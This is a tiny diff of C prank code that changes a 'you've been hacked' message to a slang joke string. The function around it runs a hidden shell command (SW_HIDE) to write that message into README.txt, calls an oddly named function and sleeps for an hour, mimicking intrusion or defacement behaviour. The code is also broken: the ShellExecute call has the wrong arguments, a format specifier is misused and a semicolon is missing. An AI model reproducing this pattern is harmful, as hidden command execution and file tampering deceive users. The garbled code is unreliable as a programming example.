@@ -18,7 +18,7 @@ void lol()
         int x;
         int y;
         int duration = 3600000;
-        char message[] = "you've been hacked loool";
+        char message[] = "you've been hacked by the ohio rizzler gods no cap all facts fr!!";
         ShellExecute(NULL, NULL, L"echo %c > README.txt", NULL, NULL, SW_HIDE, message);
         maozedongthecompooter()
         Sleep(duration);
